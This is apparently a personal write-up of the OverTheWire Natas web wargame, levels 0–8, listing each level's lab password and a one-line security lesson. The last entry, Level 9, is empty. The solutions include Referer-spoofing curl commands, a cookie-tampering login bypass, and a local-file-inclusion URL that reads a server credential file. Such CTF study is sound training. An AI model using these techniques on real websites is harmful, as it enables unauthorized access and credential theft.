# Natas Wargame

## Levels 0 - 10

### Level 0

- **Date**: 2026-03-05
- **URL**: `http://natas0.natas.labs.overthewire.org`
- **Password**: `natas0`
- **Tools**: Web Browser

#### The Solution

Right click on the page and select "View Page Source".

```html
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
```

#### The Lesson

Don't leave comments with sensitive information in your HTML source code!

---

### Level 1

- **Date**: 2026-03-05
- **URL**: `http://natas1.natas.labs.overthewire.org`
- **Password**: `0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. Or use DevTools (F12) > Elements.

```html
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>
```

#### The Lesson

Disabling right-click does **not** prevent users from viewing the page source!

---

### Level 2

- **Date**: 2026-03-05
- **URL**: `http://natas2.natas.labs.overthewire.org`
- **Password**: `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
```

There is a `files` directory!
Browse to `http://natas2.natas.labs.overthewire.org/files/`.
There you will find `users.txt`!

```txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

#### The Lesson

Don't leave sensitive files in web-accessible directories!

---

### Level 3

- **Date**: 2026-03-07
- **URL**: `http://natas3.natas.labs.overthewire.org`
- **Password**: `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
```

Search engines like Google ignore files and directories that are listed in a site's `robots.txt` file.

Browse to `http://natas3.natas.labs.overthewire.org/robots.txt`.

```txt
User-agent: *
Disallow: /s3cr3t/
```

Browse to the `http://natas3.natas.labs.overthewire.org/s3cr3t/` directory.
There is another file called `users.txt`!

```txt
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

#### The Lesson

Search engines may ignore robots.txt, but hackers do **not**!

---

### Level 4

- **Date**: 2026-03-07
- **URL**: `http://natas4.natas.labs.overthewire.org`
- **Password**: `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`
- **Tools**: Web Browser, `curl`

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

Authorized users should come from `http://natas5.natas.labs.overthewire.org/`.
So let's check the `Referer` header of the HTTP request.
Use the browser's DevTools (F12) > Network tab to inspect the HTTP request headers.
Notice that there is no `Referer` header.

Let's use `curl` for this!

`curl` stands for "Client URL" and is a command-line tool for making HTTP requests.

To see the headers with `curl`:
```Powershell
curl.exe -v -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org
```

To add the `Referer` header with `curl`:
```Powershell
curl.exe -v -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org
```

The `-e` flag is used to set the `Referer` header.

`curl` now gives the following response:
```html
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

#### The Lesson

Don't rely on the `Referer` header for security!

---

### Level 5

- **Date**: 2026-03-07
- **URL**: `http://natas5.natas.labs.overthewire.org`
- **Password**: `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">
Access disallowed. You are not logged in</div>
```

Even though we are logged in with the correct credentials, the page says we are not logged in.
Let's check the cookies!

Use the browser's DevTools (F12) > Application tab > Cookies and notice a cookie named `loggedin` with the value `0`.
You can just edit the value of the cookie here and set it to `1`!

Refresh the page and you will see:
```html
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
```

#### The Lesson

Don't rely on client-side cookies for authentication!

---

### Level 6

- **Date**: 2026-03-07
- **URL**: `http://natas6.natas.labs.overthewire.org`
- **Password**: `0RoJwHdSKWFTYR5WuiAewauSuNaBXned`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Open the source code (URL/index-source.html) and notice:

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

Notice `include "includes/secret.inc";`.
Let's check out `URL/includes/secret.inc`:

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Put this secret in the form and submit it. You will see:
```html
<div id="content">

Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

#### The Lesson

Don't include sensitive information in web-accessible **PHP** files!

---

### Level 7

- **Date**: 2026-03-07
- **URL**: `http://natas7.natas.labs.overthewire.org`
- **Password**: `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

Notice that the `page` parameter is being passed to `index.php`.
Maybe we can use this to read files on the server?

The hint says the password for natas8 is in `/etc/natas_webpass/natas8`.
So let's try to read that file by passing it as the `page` parameter.

Try `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`.

You will see:
```html
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

#### The Lesson

Don't use `include($_GET['page']);` in `index.php` without proper validation!

---

### Level 8

- **Date**: 2026-03-07
- **URL**: `http://natas8.natas.labs.overthewire.org`
- **Password**: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
- **Tools**: Web Browser

#### The Solution

Use CTRL + U to view the page source. And notice:

```html
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Let's check out that source code (URL/index-source.html):

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Notice the `encodeSecret` function. We can reverse it to get the original secret.

[level-08\decode.php](level-08\decode.php)
```php
<?php
$encoded = "3d3d516343746d4d6d6c315669563362";

echo base64_decode(strrev(hex2bin($encoded)));
?>
```

Run `php level-08\decode.php` and you will get `oubWYf2kBq`.

Put this secret in the form and submit it. You will see:
```html
<div id="content">

Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
<form method=post>
```

#### The Lesson

Don't put the encoded secret and its encode function in your source code!

---

### Level 9

- **Date**: 2026-03-07
- **URL**: `http://natas9.natas.labs.overthewire.org`
- **Password**: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`
- **Tools**: Web Browser

#### The Solution

